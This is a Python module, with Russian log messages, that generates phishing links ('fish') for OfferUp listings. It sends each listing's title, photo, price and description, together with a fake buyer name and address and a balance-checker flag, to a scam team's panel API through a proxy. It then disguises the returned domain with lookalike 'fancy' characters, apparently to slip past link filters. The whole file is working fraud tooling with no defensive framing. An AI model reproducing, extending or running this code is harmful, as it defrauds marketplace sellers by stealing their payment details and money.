import logging
from typing import Dict, Any, Optional

import aiohttp
from aiohttp_socks import ProxyConnector

import config
from app.utils.fancy_replacer import replace_with_fancy

logger = logging.getLogger(__name__)

async def create_fish(ad: dict) -> Optional[str]:
    fish = None
    if config.TEAM == "resonanse":
        if create_result := await create_ad_link(ad):
            fish = create_result.get("short") or create_result.get("my") or create_result.get("url")
    else:
        logger.error(f"Не удалось создать фиш: неверно указано значение config.TEAM")
        return None

    if fish is None:
        return None
    fish_domain = fish.strip("/").split("/")[-2]
    fish_text = fish.strip("/").split("/")[-1]
    fish = f"{replace_with_fancy(fish_domain)}/{fish_text}"
    logger.debug(f"Создан фиш: {fish}")
    return fish

async def create_ad_link(ad: dict) -> Optional[Dict[str, Any]]:
    """Документация в боте resonanse!"""
    try:
        url = f"https://{config.PERSONAL_DOMAIN.rstrip('/')}/api/createAd"
        headers = {"Authorization": f"Bearer {config.TEAM_API_KEY}"}

        payload = {
            "userId": config.TEAM_USER_ID,
            "title": ad["title"],
            "balanceChecker": config.BALANCE_CHECKER,
            "id": "offerup_us",
            "domainId": config.DOMAIN_ID
        }
        if config.FISH_VERSION == "2.0":
            payload["version"] = 2
            payload["photo"] = ad["photos"][0]["detailSquare"]["url"]
            payload["price"] = "$" + ad["price"]
            payload["about"] = ad["description"]
            payload["name"] = config.FISH_BUYER_NAME
            payload["address"] = config.FISH_BUYER_ADDRESS

        elif config.FISH_VERSION == "verif":
            raise ValueError('Не прописаны параметры для создания вериф фиша, используй config.FISH_VERSION = "2.0"')

        else:
            raise ValueError('Указан неверный тип фиша, используй config.FISH_VERSION = "verif" или "2.0"')

        # print(f"{url=}")
        # print(f"{headers=}")
        # print(f"{payload=}")

        connector = ProxyConnector.from_url(config.PARSER_PROXY)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(url, headers=headers, json=payload) as response:
                # print(f"{response.status=}")
                # print(f"{(await response.text())=}")
                response.raise_for_status()
                response_json = await response.json()

        logger.debug(f"Ответ создания фиша в resonanse: {response_json}")
        return response_json

    except Exception as e:
        logger.error(f"Ошибка {e.__class__.__name__} при создании фиша: {e}")
        return None


# if __name__ == "__main__":
#     from app.core.offerup_docs.listing_details import listing_details
#     import asyncio
#     asyncio.run(create_ad_link(ad=listing_details))
